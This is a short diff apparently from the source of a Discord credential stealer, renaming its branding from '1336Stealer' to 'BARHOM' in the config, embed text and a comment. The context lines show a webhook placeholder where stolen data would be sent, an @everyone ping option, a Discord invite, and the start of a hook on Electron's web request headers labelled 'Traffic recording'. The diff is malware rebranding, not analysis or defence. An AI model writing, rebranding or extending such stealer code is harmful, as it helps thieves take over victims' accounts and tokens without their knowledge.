@@ -13,7 +13,7 @@ async function getIp() {
 }
 
 var config = {
-    brand: "1336Stealer",
+    brand: "BARHOM",
 
     webhook: "%WEBHOOK_LINK%",
 
@@ -25,9 +25,9 @@ var config = {
     ping: [false, "@everyone"],
 
     embed: {
-        username: "1336Stealer",
+        username: "BARHOM",
         footer: {
-            text: `@1336Stealer`,
+            text: `@BARHOM`,
             icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
         },
         href: "https://discord.gg/MtSkEA4aNg",
@@ -150,7 +150,7 @@ class Event {
     }
 }
 
-// Traffic recording (Pirate stealer inspiration)
+// Traffic recording (Pirate BARHOM inspiration)
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     try {
